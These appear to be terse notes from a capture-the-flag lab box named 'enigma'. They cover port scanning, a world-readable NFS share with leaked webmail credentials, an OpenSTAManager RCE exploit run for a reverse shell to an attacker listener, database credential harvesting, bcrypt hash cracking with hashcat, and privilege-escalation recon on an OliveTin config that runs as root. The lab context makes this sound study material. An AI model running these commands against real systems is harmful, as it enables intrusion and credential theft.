22/tcp    open  ssh      OpenSSH 9.6p1 Ubuntu 3ubuntu13.16 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 0c:4b:d2:76:ab:10:06:92:05:dc:f7:55:94:7f:18:df (ECDSA)
|_  256 2d:6d:4a:4c:ee:2e:11:b6:c8:90:e6:83:e9:df:38:b0 (ED25519)
80/tcp    open  http     nginx 1.24.0 (Ubuntu)
|_http-title: Did not follow redirect to http://enigma.htb/
|_http-server-header: nginx/1.24.0 (Ubuntu)
110/tcp   open  pop3     Dovecot pop3d
| ssl-cert: Subject: commonName=enigma
| Subject Alternative Name: DNS:enigma
| Not valid before: 2026-02-18T20:33:33
|_Not valid after:  2036-02-16T20:33:33
|_ssl-date: TLS randomness does not represent time
|_pop3-capabilities: SASL UIDL AUTH-RESP-CODE CAPA RESP-CODES PIPELINING TOP STLS
111/tcp   open  rpcbind  2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100003  3,4         2049/tcp   nfs
|   100003  3,4         2049/tcp6  nfs
|   100005  1,2,3      34121/tcp   mountd
|   100005  1,2,3      41768/udp   mountd
|   100005  1,2,3      50149/udp6  mountd
|   100005  1,2,3      51751/tcp6  mountd
|   100021  1,3,4      33009/tcp   nlockmgr
|   100021  1,3,4      34064/udp6  nlockmgr
|   100021  1,3,4      39467/tcp6  nlockmgr
|   100021  1,3,4      57706/udp   nlockmgr
|   100024  1          43813/tcp   status
|   100024  1          51149/tcp6  status
|   100024  1          58047/udp6  status
|   100024  1          58708/udp   status
|   100227  3           2049/tcp   nfs_acl
|_  100227  3           2049/tcp6  nfs_acl
143/tcp   open  imap     Dovecot imapd (Ubuntu)
|_imap-capabilities: more SASL-IR IMAP4rev1 LITERAL+ ID Pre-login have ENABLE post-login OK IDLE LOGIN-REFERRALS listed LOGINDISABLEDA0001 capabilities STARTTLS
| ssl-cert: Subject: commonName=enigma
| Subject Alternative Name: DNS:enigma
| Not valid before: 2026-02-18T20:33:33
|_Not valid after:  2036-02-16T20:33:33
|_ssl-date: TLS randomness does not represent time
993/tcp   open  ssl/imap Dovecot imapd (Ubuntu)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=enigma
| Subject Alternative Name: DNS:enigma
| Not valid before: 2026-02-18T20:33:33
|_Not valid after:  2036-02-16T20:33:33
|_imap-capabilities: SASL-IR IMAP4rev1 LITERAL+ ID Pre-login more ENABLE have OK post-login AUTH=PLAINA0001 listed IDLE capabilities LOGIN-REFERRALS
995/tcp   open  ssl/pop3 Dovecot pop3d
|_pop3-capabilities: SASL(PLAIN) UIDL AUTH-RESP-CODE CAPA RESP-CODES USER TOP PIPELINING
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=enigma
| Subject Alternative Name: DNS:enigma
| Not valid before: 2026-02-18T20:33:33
|_Not valid after:  2036-02-16T20:33:33
2049/tcp  open  nfs_acl  3 (RPC #100227)
33009/tcp open  nlockmgr 1-4 (RPC #100021)
34121/tcp open  mountd   1-3 (RPC #100005)
38593/tcp open  mountd   1-3 (RPC #100005)
43813/tcp open  status   1 (RPC #100024)
47651/tcp open  mountd   1-3 (RPC #100005)


└─$ showmount -e 10.129.7.107           
Export list for 10.129.7.107:
/srv/nfs/onboarding *
                        
└─$ sudo mount  10.129.7.107:/srv/nfs/onboarding /home/ed/oscptest/enigma/mnt

└─$ ls mnt  
New_Employee_Access.pdf

Employee:Kevin Mitchell
Department:Operations
Provisioned by:IT Department
Date:2024-03-01
Webmail Access
URL:http://mail001.enigma.htb
Username:kevin
Password:Enigma2024!

add subdomain into hosts

http://mail001.enigma.htb/?_task=settings#

sarah@enigma.htb
Roundcube Webmail 1.6.16  


login webmial as sarah with default passwd

URL: http://support_001.enigma.htb
Username: admin
Password: Ne3s4rtars78s

again add hosts

http://support_001.enigma.htb/controller.php?id_module=1
openstamanager  2.9.8 
 
 https://github.com/b0ySie7e/OpenSTAManager-RCE-Exploit-CVE-2026-38751

 └─$ ./openstamanager-rce-exploit --url http://support_001.enigma.htb --user admin  --password Ne3s4rtars78s --lhost 10.10.15.204 --lport 8821

www-data@enigma:~/html/openstamanager/modules/shell$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

<amanager/modules/shell$ cat /etc/passwd | grep bash 
root:x:0:0:root:/root:/bin/bash
haris:x:1000:1000:,,,:/home/haris:/bin/bash



$config['db_dsnw'] = 'mysql://roundcube:Yo270x26!gTx02@localhost/roundcubemail';


-rw-r--r-- 1 www-data www-data 26805 Dec 23  2025 /var/www/html/openstamanager/modules/aggiornamenti/database.php


Files with capabilities (limited to 50):
/usr/bin/ping cap_net_raw=ep
/usr/bin/mtr-packet cap_net_raw=ep
/usr/lib/snapd/snap-confine cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_setgid,cap_setuid,cap_sys_chroot,cap_sys_ptrace,cap_sys_admin,cap_sys_resource=p

╔══════════╣ Mails (limit 50)
    78805      0 -rw-------   1 haris    mail            0 Feb 18 20:53 /var/mail/haris
   145310      4 -rw-------   1 root     mail         1197 Jun 30 09:21 /var/mail/root
   145185      4 -rw-------   1 kevin    mail         2080 Feb 18 21:29 /var/mail/kevin
   145247      4 -rw-------   1 it       mail         2485 Feb 18 21:42 /var/mail/it
   145246      4 -rw-------   1 sarah    mail         1447 Feb 18 21:42 /var/mail/sarah
    78805      0 -rw-------   1 haris    mail            0 Feb 18 20:53 /var/spool/mail/haris
   145310      4 -rw-------   1 root     mail         1197 Jun 30 09:21 /var/spool/mail/root
   145185      4 -rw-------   1 kevin    mail         2080 Feb 18 21:29 /var/spool/mail/kevin
   145247      4 -rw-------   1 it       mail         2485 Feb 18 21:42 /var/spool/mail/it
   145246      4 -rw-------   1 sarah    mail         1447 Feb 18 21:42 /var/spool/mail/sarah

cat /var/www/html/openstamanager/config.inc.php

$db_host = 'localhost';
$db_username = 'brollin';
$db_password = 'Fri3nds@9099';
$db_name = 'openstamanager';
// $port = '|port|';
$db_options = [

mysql -u brollin -pFri3nds@9099 -h localhost openstamanager \
  -B -e "SELECT username, password FROM zz_users;"

haris 	$2y$10$WHf1T79sxjsZongUKT2jGeexTkvihBQyCZeoYXmObiNphrsZDr6eC

hashcat -m 3200 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt
 bestfriends

su haris
id
# uid=1001(haris) gid=1001(haris) groups=1001(haris)

haris@enigma:~$ ps -auxf | grep root

root        1527  0.0  0.4 1238992 16100 ?       Ssl  08:33   0:00 /usr/local/bin/OliveTin

haris@enigma:/etc/OliveTin$ cat config.yaml 

# Docs: https://docs.olivetin.app/entities/intro.html
  - title: Backup Database
    id: backup_database
    icon: "⛁"
    shell: "mysqldump -u {{ db_user }} -p'{{ db_pass }}' {{ db_name }} > /opt/backups/backup.sql"
    popupOnStart: execution-dialog
    arguments:
      - name: db_user
        type: ascii_identifier
        default: backup_svc
      - name: db_pass
        type: password
      - name: db_name
        type: ascii_identifier
        default: production



